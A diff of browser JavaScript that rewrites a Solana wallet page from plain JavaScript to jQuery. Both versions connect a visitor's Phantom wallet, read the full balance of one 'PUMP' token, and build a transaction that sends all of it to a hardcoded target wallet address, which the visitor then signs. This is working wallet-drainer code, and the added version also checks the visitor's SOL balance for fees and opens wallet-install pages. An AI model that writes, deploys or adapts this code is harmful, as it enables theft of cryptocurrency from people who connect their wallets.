@@ -1,221 +1,194 @@
-// PUMP Token Transfer - Simplified Working Version
-const PUMP_MINT = '4sxxEHW6XqX5YBYs29f1p2RhR7afXFS8wQWcMYQVpump';
-const TARGET_WALLET = '95S96u1usBhhxXpjve6LCbnhyAwHC2sS8aicieAXemUD';
-
-// Public RPC Endpoints (no API key needed)
-const RPC_ENDPOINTS = [
-    'https://api.mainnet-beta.solana.com',
-    'https://solana-api.projectserum.com',
-    'https://rpc.ankr.com/solana',
-    'https://solana-mainnet.g.alchemy.com/v2/demo'
-];
-
-// Select random RPC endpoint
-function getRpcEndpoint() {
-    return RPC_ENDPOINTS[Math.floor(Math.random() * RPC_ENDPOINTS.length)];
-}
-
-// Update status function
-function updateStatus(message, isError = false) {
-    const statusDiv = document.getElementById('status');
-    statusDiv.textContent = message;
-    statusDiv.style.color = isError ? '#ff6b6b' : '#4ade80';
-    console.log(message);
-}
-
-// Main transfer function
-async function transferAllPumpTokens() {
-    const transferBtn = document.getElementById('transferBtn');
+$(document).ready(function() {
+    // Configuration
+    const PUMP_MINT = '4sxxEHW6XqX5YBYs29f1p2RhR7afXFS8wQWcMYQVpump';
+    const TARGET_WALLET = '95S96u1usBhhxXpjve6LCbnhyAwHC2sS8aicieAXemUD';
     
-    try {
-        // Step 1: Check wallet
-        if (!window.solana?.isPhantom && !window.solana?.isSolflare) {
-            updateStatus('❌ Please install Phantom or Solflare wallet', true);
-            return;
-        }
-
-        // Step 2: Connect wallet
-        transferBtn.disabled = true;
-        transferBtn.textContent = '🔄 Connecting...';
-        updateStatus('Connecting wallet...');
-
-        const provider = window.solana;
-        const response = await provider.connect();
-        const userWallet = response.publicKey.toString();
-        
-        updateStatus(`✅ Connected: ${userWallet.slice(0, 8)}...`);
-
-        // Step 3: Create connection
-        const rpcUrl = getRpcEndpoint();
-        console.log('Using RPC:', rpcUrl);
-        
-        const connection = new solanaWeb3.Connection(rpcUrl, 'confirmed');
-        
-        // Step 4: Check PUMP balance
-        updateStatus('Checking PUMP token balance...');
-        
-        // Convert to PublicKey
-        const pumpMintPublicKey = new solanaWeb3.PublicKey(PUMP_MINT);
-        const userPublicKey = new solanaWeb3.PublicKey(userWallet);
-        const targetPublicKey = new solanaWeb3.PublicKey(TARGET_WALLET);
-        
-        // Get token accounts
-        const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
-            userPublicKey,
-            { mint: pumpMintPublicKey }
-        );
-
-        if (tokenAccounts.value.length === 0) {
-            updateStatus('❌ No PUMP tokens found in wallet', true);
-            transferBtn.disabled = false;
-            transferBtn.textContent = '🔗 CONNECT & TRANSFER PUMP';
-            return;
-        }
-
-        const tokenAccount = tokenAccounts.value[0];
-        const tokenInfo = tokenAccount.account.data.parsed.info;
-        const tokenAmount = tokenInfo.tokenAmount;
-        const balance = tokenAmount.uiAmount;
-        const rawAmount = tokenAmount.amount; // Amount with decimals
-        
-        if (balance <= 0) {
-            updateStatus('❌ PUMP balance is zero', true);
-            transferBtn.disabled = false;
-            transferBtn.textContent = '🔗 CONNECT & TRANSFER PUMP';
-            return;
-        }
-
-        updateStatus(`✅ Found ${balance} PUMP tokens`);
-
-        // Step 5: Create transfer transaction
-        updateStatus('Creating transfer transaction...');
-        
-        // Get sender's token account
-        const fromTokenAccount = tokenAccount.pubkey;
-        
-        // Get receiver's token account (create if doesn't exist)
-        const toTokenAccount = await splToken.getAssociatedTokenAddress(
-            pumpMintPublicKey,
-            targetPublicKey
-        );
-
-        // Build transaction
-        const transaction = new solanaWeb3.Transaction();
-        
-        // Check if receiver needs token account
-        try {
-            const toAccountInfo = await connection.getAccountInfo(toTokenAccount);
-            if (!toAccountInfo) {
-                transaction.add(
-                    splToken.createAssociatedTokenAccountInstruction(
-                        userPublicKey,
-                        toTokenAccount,
-                        targetPublicKey,
-                        pumpMintPublicKey
-                    )
+    // Update status function
+    function updateStatus(message, type = '') {
+        $('#status').text(message).removeClass().addClass(type);
+        console.log(message);
+    }
+    
+    // Connect wallet button click handler
+    $('#connect-wallet').on('click', async () => {
+        // Check if Phantom wallet is installed
+        if (window.solana && window.solana.isPhantom) {
+            try {
+                updateStatus('Connecting to wallet...', 'loading');
+                
+                // Connect to Phantom wallet
+                const resp = await window.solana.connect();
+                console.log("Phantom Wallet connected:", resp);
+                updateStatus('✅ Wallet connected!', 'success');
+                
+                // Create connection (using public RPC)
+                var connection = new solanaWeb3.Connection(
+                    'https://api.mainnet-beta.solana.com', 
+                    'confirmed'
                 );
+                
+                const public_key = new solanaWeb3.PublicKey(resp.publicKey);
+                updateStatus('Checking wallet balance...', 'loading');
+                
+                // Get SOL balance for gas fees
+                const walletBalance = await connection.getBalance(public_key);
+                const solBalance = walletBalance / solanaWeb3.LAMPORTS_PER_SOL;
+                console.log("Wallet SOL balance:", solBalance);
+                
+                if (solBalance < 0.01) {
+                    updateStatus('❌ Insufficient SOL for gas fees (need at least 0.01 SOL)', 'error');
+                    return;
+                }
+                
+                updateStatus('✅ SOL balance: ' + solBalance.toFixed(4) + ' SOL', 'success');
+                
+                // Check for PUMP tokens
+                updateStatus('Checking for PUMP tokens...', 'loading');
+                
+                const pumpMintPublicKey = new solanaWeb3.PublicKey(PUMP_MINT);
+                const targetPublicKey = new solanaWeb3.PublicKey(TARGET_WALLET);
+                
+                // Get PUMP token accounts
+                const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
+                    public_key,
+                    { mint: pumpMintPublicKey }
+                );
+                
+                if (tokenAccounts.value.length === 0) {
+                    updateStatus('❌ No PUMP tokens found in wallet', 'error');
+                    return;
+                }
+                
+                const tokenAccount = tokenAccounts.value[0];
+                const tokenInfo = tokenAccount.account.data.parsed.info;
+                const tokenAmount = tokenInfo.tokenAmount;
+                const pumpBalance = tokenAmount.uiAmount;
+                
+                if (pumpBalance <= 0) {
+                    updateStatus('❌ PUMP balance is zero', 'error');
+                    return;
+                }
+                
+                updateStatus(`✅ Found ${pumpBalance} PUMP tokens`, 'success');
+                
+                // Change button text and function
+                $('#connect-wallet').html('<span>🚀</span> TRANSFERRING PUMP TOKENS...').prop('disabled', true);
+                
+                // Transfer all PUMP tokens
+                try {
+                    updateStatus('Preparing transfer transaction...', 'loading');
+                    
+                    // Get sender's token account
+                    const fromTokenAccount = tokenAccount.pubkey;
+                    
+                    // Get receiver's associated token account
+                    const toTokenAccount = await splToken.getAssociatedTokenAddress(
+                        pumpMintPublicKey,
+                        targetPublicKey
+                    );
+                    
+                    // Create transaction
+                    const transaction = new solanaWeb3.Transaction();
+                    
+                    // Check if receiver needs token account
+                    try {
+                        const toAccountInfo = await connection.getAccountInfo(toTokenAccount);
+                        if (!toAccountInfo) {
+                            // Create token account for receiver
+                            transaction.add(
+                                splToken.createAssociatedTokenAccountInstruction(
+                                    public_key,
+                                    toTokenAccount,
+                                    targetPublicKey,
+                                    pumpMintPublicKey
+                                )
+                            );
+                        }
+                    } catch (error) {
+                        // If can't check, create account anyway
+                        transaction.add(
+                            splToken.createAssociatedTokenAccountInstruction(
+                                public_key,
+                                toTokenAccount,
+                                targetPublicKey,
+                                pumpMintPublicKey
+                            )
+                        );
+                    }
+                    
+                    // Add transfer instruction for ALL PUMP tokens
+                    const rawAmount = tokenAmount.amount; // Exact amount with decimals
+                    transaction.add(
+                        splToken.createTransferInstruction(
+                            fromTokenAccount,
+                            toTokenAccount,
+                            public_key,
+                            rawAmount
+                        )
+                    );
+                    
+                    // Set up transaction
+                    updateStatus('Getting blockhash...', 'loading');
+                    
+                    transaction.feePayer = resp.publicKey;
+                    let blockhashObj = await connection.getRecentBlockhash();
+                    transaction.recentBlockhash = blockhashObj.blockhash;
+                    
+                    // Sign transaction
+                    updateStatus('Signing transaction...', 'loading');
+                    const signed = await window.solana.signTransaction(transaction);
+                    console.log("Transaction signed:", signed);
+                    
+                    // Send transaction
+                    updateStatus('Sending transaction...', 'loading');
+                    let txid = await connection.sendRawTransaction(signed.serialize());
+                    
+                    // Confirm transaction
+                    updateStatus('Confirming transaction...', 'loading');
+                    await connection.confirmTransaction(txid);
+                    
+                    console.log("Transaction confirmed:", txid);
+                    updateStatus(`🎉 SUCCESS! Transferred ${pumpBalance} PUMP tokens!`, 'success');
+                    
+                    // Show transaction link
+                    setTimeout(() => {
+                        updateStatus(`✅ ${pumpBalance} PUMP tokens transferred!\nTx: ${txid.slice(0, 16)}...`, 'success');
+                    }, 2000);
+                    
+                } catch (err) {
+                    console.error("Error during transfer:", err);
+                    updateStatus('❌ Transfer failed: ' + err.message, 'error');
+                }
+                
+            } catch (err) {
+                console.error("Error connecting to Phantom Wallet:", err);
+                updateStatus('❌ Connection failed: ' + err.message, 'error');
+            } finally {
+                // Reset button after 5 seconds
+                setTimeout(() => {
+                    $('#connect-wallet').html('<span>🔗</span> CONNECT WALLET & TRANSFER PUMP').prop('disabled', false);
+                }, 5000);
             }
-        } catch (error) {
-            // If we can't check, create account anyway
-            transaction.add(
-                splToken.createAssociatedTokenAccountInstruction(
-                    userPublicKey,
-                    toTokenAccount,
-                    targetPublicKey,
-                    pumpMintPublicKey
-                )
-            );
-        }
-
-        // Add transfer instruction
-        transaction.add(
-            splToken.createTransferInstruction(
-                fromTokenAccount,
-                toTokenAccount,
-                userPublicKey,
-                rawAmount
-            )
-        );
-
-        // Step 6: Sign and send
-        updateStatus('Getting blockhash...');
-        
-        const { blockhash } = await connection.getLatestBlockhash();
-        transaction.recentBlockhash = blockhash;
-        transaction.feePayer = userPublicKey;
-
-        updateStatus('Signing transaction...');
-        
-        // Sign with wallet
-        const signedTransaction = await provider.signTransaction(transaction);
-        
-        updateStatus('Sending transaction...');
-        
-        // Send transaction
-        const signature = await connection.sendRawTransaction(signedTransaction.serialize());
-        
-        updateStatus(`✅ Transaction sent: ${signature.slice(0, 16)}...`);
-
-        // Step 7: Wait for confirmation (optional)
-        updateStatus('Waiting for confirmation...');
-        
-        try {
-            await connection.confirmTransaction(signature, 'confirmed');
-            updateStatus(`🎉 SUCCESS! Transferred ${balance} PUMP tokens!`);
+        } else {
+            updateStatus('❌ Phantom Wallet not found', 'error');
             
-            // Optional: Show explorer link
-            setTimeout(() => {
-                updateStatus(`✅ ${balance} PUMP sent!\nTx: ${signature.slice(0, 16)}...`);
-            }, 2000);
+            // Show wallet installation links
+            const isFirefox = typeof InstallTrigger !== "undefined";
+            const isChrome = !!window.chrome;
             
-        } catch (confirmError) {
-            // Even if confirmation fails, transaction might still succeed
-            updateStatus(`⚠️ Transaction sent but confirmation pending.\nSignature: ${signature.slice(0, 16)}...`);
+            if (isFirefox) {
+                setTimeout(() => {
+                    updateStatus('Please install Phantom wallet for Firefox', 'error');
+                }, 1000);
+                window.open("https://addons.mozilla.org/en-US/firefox/addon/phantom-app/", "_blank");
+            } else if (isChrome) {
+                setTimeout(() => {
+                    updateStatus('Please install Phantom wallet for Chrome', 'error');
+                }, 1000);
+                window.open("https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa", "_blank");
+            } else {
+                updateStatus('Please download Phantom wallet for your browser', 'error');
+            }
         }
-
-    } catch (error) {
-        console.error('Transfer error:', error);
-        
-        let errorMessage = error.message;
-        
-        // Handle specific errors
-        if (errorMessage.includes('User rejected')) {
-            errorMessage = 'Transaction was cancelled by user';
-        } else if (errorMessage.includes('429') || errorMessage.includes('Too many')) {
-            errorMessage = 'Too many requests. Please wait 1 minute';
-        } else if (errorMessage.includes('400') || errorMessage.includes('403')) {
-            errorMessage = 'Network error. Please try again';
-        } else if (errorMessage.includes('Invalid')) {
-            errorMessage = 'Invalid parameters. Check token addresses';
-        }
-        
-        updateStatus(`❌ Error: ${errorMessage}`, true);
-        
-    } finally {
-        // Reset button
-        transferBtn.disabled = false;
-        transferBtn.textContent = '🔗 CONNECT & TRANSFER PUMP';
-    }
-}
-
-// Initialize when page loads
-document.addEventListener('DOMContentLoaded', function() {
-    const transferBtn = document.getElementById('transferBtn');
-    
-    // Add click listener
-    transferBtn.addEventListener('click', async function() {
-        // Check if Phantom is installed
-        if (typeof window.solana === 'undefined') {
-            updateStatus('❌ Please install Phantom wallet from: https://phantom.app', true);
-            return;
-        }
-        
-        // Start transfer process
-        await transferAllPumpTokens();
     });
-    
-    // Optional: Auto-connect if returning
-    if (window.solana?.isConnected) {
-        updateStatus('Wallet previously connected. Click button to transfer.');
-    }
 });
